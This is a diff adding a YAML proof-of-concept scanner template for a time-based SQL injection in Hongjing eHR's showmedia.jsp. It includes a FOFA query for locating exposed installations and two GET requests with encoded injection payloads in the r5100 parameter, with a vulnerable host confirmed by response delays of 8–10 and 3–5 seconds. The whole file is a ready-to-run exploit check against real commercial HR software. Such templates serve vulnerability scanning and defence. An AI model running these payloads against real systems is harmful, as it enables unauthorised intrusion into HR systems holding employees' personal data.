@@ -1,0 +1,33 @@
+id: poc-yaml-hjsoft-ehr-showmedia-sqli
+info:
+  name: 宏景eHR-showmedia.jsp存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+requests:
+- method: GET
+  path: /train/resource/course/showmedia.jsp?a_code&r5100=RzvoYYlxoMjNIPAATTP2HJBPAATTPGGqY4XJPloJ5D5mnYCLzn1uPAATTP2HJBPAATTPQPnPAATTP2HJBPAATTPXdzNJ8pj7I9Y5s1xDAUfUx
+  expression: 'status_code == 200 &&
+
+    duration >= 8 &&
+
+    duration <= 10 &&
+
+    contains(body,`<input type="hidden" name="r5000" value="">`)
+
+    '
+- method: GET
+  path: /train/resource/course/showmedia.jsp?a_code&r5100=RzvoYYlxoMjNIPAATTP2HJBPAATTPGGqY4XJPloJ5D5mnYCLzn1uPAATTP2HJBPAATTPQPnPAATTP2HJBPAATTPXdzNJ8pj7I9UbgPAATTP2HJFPAATTP2NRYxLQ
+  expression: 'status_code == 200 &&
+
+    duration >= 3 &&
+
+    duration <= 5 &&
+
+    contains(body,`<input type="hidden" name="r5000" value="">`)
+
+    '
+variables: {}
+transport: http
